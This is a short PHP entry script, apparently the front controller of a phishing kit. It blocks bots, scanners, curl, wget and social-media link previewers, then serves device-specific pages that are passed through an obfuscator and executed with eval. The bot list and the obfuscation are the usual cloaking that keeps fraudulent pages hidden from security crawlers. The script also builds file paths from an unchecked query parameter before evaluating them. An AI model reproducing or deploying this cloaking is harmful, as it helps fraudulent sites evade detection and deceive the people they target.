<?php


require_once('config.php');

require_once('api/ofuscador.php');
require_once('api/browser_detection.php');
require_once('api/functions.php');
require_once('api/database.php');
require_once('api/ip_info.php');
 
function detectarRobo() {
	// 1. User Agent vazio
	if(empty($_SERVER['HTTP_USER_AGENT'])){
		return true;
	}
	$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
	// 2. Lista de bots conhecidos
	$bots = [
		'bot','spider','crawler','curl','wget','python','scrapy',
		'java','libwww','httpclient','perl','scan','fetch','facebook',
		'preview','monitor','checker','masscan','zgrab'
	];
	foreach ($bots as $bot) {
		if (strpos($ua, $bot) !== false) {
			return true;
		}
	}
	// 3. Verificar se aceita html
	if(!isset($_SERVER['HTTP_ACCEPT']) || strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false){
		return true;
	}

	return false;
}

	if (is_ssl_active() == false) {
		header('HTTP/1.1 301 Moved Permanently');
		header('Location: '.'https://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);	  
	}


	$user_agent       =  get_user_agent();		
	$Browser          =  new BrowserDetection();	
	$tipo_dispositivo =  $Browser->getDevice($user_agent)['device_type'];

	$page = (isset($_GET['page'])) ? $_GET['page']:'splash';
	$page = array_filter(explode('/',$page));
	
    if ($page[0] == 'splash'){
    	$page[1] = 'splash';
    }
  
	if ($tipo_dispositivo == 'desktop'){
			$file = 'page/desktop_'.$page[1].'.php';
		}else{
			$file = 'page/mobile_'.$page[1].'.php';
	} 

	if(detectarRobo()){
			header("HTTP/1.1 403 Forbidden");
			echo "403 Forbidden";
			exit;
		}else{
			if(is_file($file)){
             		$codigo_pagina = ofuscarPagina($file);
				 eval("?>".$codigo_pagina);
		
			}else{
				include 'pages/404.php';
			} 			
	}

?>
